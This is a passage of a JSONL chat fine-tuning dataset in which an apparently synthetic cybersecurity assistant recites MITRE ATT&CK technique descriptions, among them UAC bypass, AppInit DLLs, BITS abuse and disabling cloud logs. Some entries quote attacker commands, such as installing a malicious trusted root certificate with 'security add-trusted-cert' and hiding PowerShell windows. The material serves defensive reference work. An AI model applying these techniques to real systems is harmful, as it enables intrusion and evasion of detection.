[Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish)Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence.(Citation: SpectorOps Code Signing Dec 2017)In macOS, the Ay MaMi malware uses <code>/usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert</code> to install a malicious certificate as a trusted root certificate into the system keychain.(Citation: objective-see ay mami 2018). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Logon Script' and with the Id: T1037.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Logon Script' and with the Id: T1037.003 is described as follows: Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence. Network logon scripts can be assigned using Active Directory or Group Policy Objects.(Citation: Petri Logon Script AD) These logon scripts run with the privileges of the user they are assigned to. Depending on the systems within the network, initializing one of these scripts could apply to more than one or potentially all systems.   Adversaries may use these scripts to maintain persistence on a network. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Endpoint Denial of Service' and with the Id: T1499 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Endpoint Denial of Service' and with the Id: T1499 is described as follows: Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).To perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.Adversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.Botnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)For attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).. The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Compile After Delivery' and with the Id: T1027.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Compile After Delivery' and with the Id: T1027.004 is described as follows: Adversaries may attempt to make payloads difficult to discover and analyze by delivering files to victims as uncompiled code. Text-based source code files may subvert analysis and scrutiny from protections targeting executables/binaries. These payloads will need to be compiled before execution; typically via native utilities such as csc.exe or GCC/MinGW.(Citation: ClearSky MuddyWater Nov 2018)Source code payloads may also be encrypted, encoded, and/or embedded within other files, such as those delivered as a [Phishing](https://attack.mitre.org/techniques/T1566). Payloads may also be delivered in formats unrecognizable and inherently benign to the native OS (ex: EXEs on macOS/Linux) before later being (re)compiled into a proper executable binary with a bundled compiler and execution framework.(Citation: TrendMicro WindowsAppMac). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Uncommonly Used Port' and with the Id: T1065 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Uncommonly Used Port' and with the Id: T1065 is described as follows: Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Location Discovery' and with the Id: T1614 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Location Discovery' and with the Id: T1614 is described as follows: Adversaries may gather information in an attempt to calculate the geographical location of a victim host. Adversaries may use the information from [System Location Discovery](https://attack.mitre.org/techniques/T1614) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Adversaries may attempt to infer the location of a system using various system checks, such as time zone, keyboard layout, and/or language settings.(Citation: FBI Ragnar Locker 2020)(Citation: Sophos Geolocation 2016)(Citation: Bleepingcomputer RAT malware 2020) Windows API functions such as <code>GetLocaleInfoW</code> can also be used to determine the locale of the host.(Citation: FBI Ragnar Locker 2020) In cloud environments, an instance's availability zone may also be discovered by accessing the instance metadata service from the instance.(Citation: AWS Instance Identity Documents)(Citation: Microsoft Azure Instance Metadata 2021)Adversaries may also attempt to infer the location of a victim host using IP addressing, such as via online geolocation IP-lookup services.(Citation: Securelist Trasparent Tribe 2020)(Citation: Sophos Geolocation 2016). The systems targeted by this attack pattern are: Windows, Linux, macOS, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'VBA Stomping' and with the Id: T1564.007 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'VBA Stomping' and with the Id: T1564.007 is described as follows: Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.(Citation: FireEye VBA stomp Feb 2020)MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has a <code>PerformanceCache</code> that stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the <code>_VBA_PROJECT</code> stream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.(Citation: Evil Clippy May 2019)(Citation: Microsoft _VBA_PROJECT Stream)An adversary may hide malicious VBA code by overwriting the VBA source code location with zero\u2019s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the <code>_VBA_PROJECT</code> stream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.(Citation: Walmart Roberts Oct 2018)(Citation: FireEye VBA stomp Feb 2020)(Citation: pcodedmp Bontchev). The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'BITS Jobs' and with the Id: T1197 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'BITS Jobs' and with the Id: T1197 is described as follows: Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'MSBuild' and with the Id: T1127.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'MSBuild' and with the Id: T1127.001 is described as follows: Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild)Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Impersonation' and with the Id: T1656 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Impersonation' and with the Id: T1656 is described as follows: Adversaries may impersonate a trusted person or organization in order to persuade and trick a target into performing some action on their behalf. For example, adversaries may communicate with victims (via [Phishing for Information](https://attack.mitre.org/techniques/T1598), [Phishing](https://attack.mitre.org/techniques/T1566), or [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)) while impersonating a known sender such as an executive, colleague, or third-party vendor. Established trust can then be leveraged to accomplish an adversary\u2019s ultimate goals, possibly against multiple victims.  In many cases of business email compromise or email fraud campaigns, adversaries use impersonation to defraud victims -- deceiving them into sending money or divulging information that ultimately enables [Financial Theft](https://attack.mitre.org/techniques/T1657).Adversaries will often also use social engineering techniques such as manipulative and persuasive language in email subject lines and body text such as `payment`, `request`, or `urgent` to push the victim to act quickly before malicious activity is detected. These campaigns are often specifically targeted against people who, due to job roles and/or accesses, can carry out the adversary\u2019s goal.\u202f\u202f  Impersonation is typically preceded by reconnaissance techniques such as [Gather Victim Identity Information](https://attack.mitre.org/techniques/T1589) and [Gather Victim Org Information](https://attack.mitre.org/techniques/T1591) as well as acquiring infrastructure such as email domains (i.e. [Domains](https://attack.mitre.org/techniques/T1583/001)) to substantiate their false identity.(Citation: CrowdStrike-BEC) There is the potential for multiple victims in campaigns involving impersonation. For example, an adversary may [Compromise Accounts](https://attack.mitre.org/techniques/T1586) targeting one organization which can then be used to support impersonation against other entities.(Citation: VEC). The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, SaaS, Google Workspace ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Cloud Compute Configurations' and with the Id: T1578.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Cloud Compute Configurations' and with the Id: T1578.005 is described as follows: Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim\u2019s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional [Resource Hijacking](https://attack.mitre.org/techniques/T1496) without raising suspicion by using up a victim\u2019s entire quota.(Citation: Microsoft Cryptojacking 2023) Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.(Citation: Microsoft Azure Policy)Adversaries may also modify settings that affect where cloud resources can be deployed, such as enabling [Unused/Unsupported Cloud Regions](https://attack.mitre.org/techniques/T1535). In Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources, or engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant.(Citation: Microsoft Peach Sandstorm 2023) This will allow the adversary to use the victim\u2019s compute resources without generating logs on the victim tenant.(Citation: Microsoft Azure Policy) (Citation: Microsoft Subscription Hijacking 2022). The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Bypass User Account Control' and with the Id: T1088 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Bypass User Account Control' and with the Id: T1088 is described as follows: Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user. (Citation: Davidson Windows) Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.Many methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods (Citation: Github UACMe) that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script. (Citation: enigma0x3 Fileless UAC Bypass) (Citation: Fortinet Fareit)Another bypass is possible through some Lateral Movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity. (Citation: SANS UAC Bypass). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Runtime Data Manipulation' and with the Id: T1494 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Runtime Data Manipulation' and with the Id: T1494 is described as follows: Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conduct [Change Default File Association](https://attack.mitre.org/techniques/T1042) and [Masquerading](https://attack.mitre.org/techniques/T1036) to cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Fronting' and with the Id: T1090.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Fronting' and with the Id: T1090.004 is described as follows: Adversaries may take advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) Domain fronting involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'ARP Cache Poisoning' and with the Id: T1557.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'ARP Cache Poisoning' and with the Id: T1557.002 is described as follows: Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003). The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Disable or Modify Cloud Logs' and with the Id: T1562.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Disable or Modify Cloud Logs' and with the Id: T1562.008 is described as follows: An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.For example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity.(Citation: Following the CloudTrail: Generating strong AWS security signals with Sumo Logic) They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files.(Citation: AWS Update Trail)(Citation: Pacu Detection Disruption Module) In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.(Citation: Dark Reading Microsoft 365 Attacks 2021). The systems targeted by this attack pattern are: IaaS, SaaS, Google Workspace, Azure AD, Office 365 ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Security Software Discovery' and with the Id: T1518.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Security Software Discovery' and with the Id: T1518.001 is described as follows: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code> with [Reg](https://attack.mitre.org/software/S0075), <code>dir</code> with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.Adversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009) to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.. The systems targeted by this attack pattern are: Windows, IaaS, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hidden Window' and with the Id: T1564.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hidden Window' and with the Id: T1564.003 is described as follows: Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks. Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.(Citation: Antiquated Mac Malware)On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can be <code>apple.awt.UIElement</code>, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.Similarly, on Windows there are a variety of features in scripting languages, such as [PowerShell](https://attack.mitre.org/techniques/T1059/001), Jscript, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005) to make windows hidden. One example of this is <code>powershell.exe -WindowStyle Hidden</code>.(Citation: PowerShell About 2019)In addition, Windows supports the `CreateDesktop()` API that can create a hidden desktop window with its own corresponding <code>explorer.exe</code> process.(Citation: Hidden VNC)(Citation: Anatomy of an hVNC Attack)  All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,(Citation: Hidden VNC) will be invisible to other desktops windows.. The systems targeted by this attack pattern are: macOS, Windows, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Transmitted Data Manipulation' and with the Id: T1493 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Transmitted Data Manipulation' and with the Id: T1493 is described as follows: Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making. Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Python' and with the Id: T1059.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Python' and with the Id: T1059.006 is described as follows: Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the <code>python.exe</code> interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.(Citation: Zscaler APT31 Covid-19 October 2020)Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.. The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Identify Roles' and with the Id: T1591.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Identify Roles' and with the Id: T1591.004 is described as follows: Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.Adversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Data Encoding' and with the Id: T1132 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Data Encoding' and with the Id: T1132 is described as follows: Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'AppInit DLLs' and with the Id: T1546.010 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'AppInit DLLs' and with the Id: T1546.010 is described as follows: Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)Similar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. The AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Phishing for Information' and with the Id: T1598 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Phishing for Information' and with the Id: T1598 is described as follows: Adversaries may send phishing messages to elicit sensitive information that can be used during targeting. Phishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Phishing for information is different from [Phishing](https://attack.mitre.org/techniques/T1566) in that the objective is gathering data from the victim rather than executing malicious code.All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass credential harvesting campaigns.Adversaries may also try to obtain information directly through the exchange of emails, instant messages, or other electronic conversation means.(Citation: ThreatPost Social Media Phishing)(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin)(Citation: Sophos Attachment)(Citation: GitHub Phishery) Victims may also receive phishing messages that direct them to call a phone number where the adversary attempts to collect confidential information.(Citation: Avertium callback phishing)Phishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages. Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof) the identity of the sender which can be used to fool both the 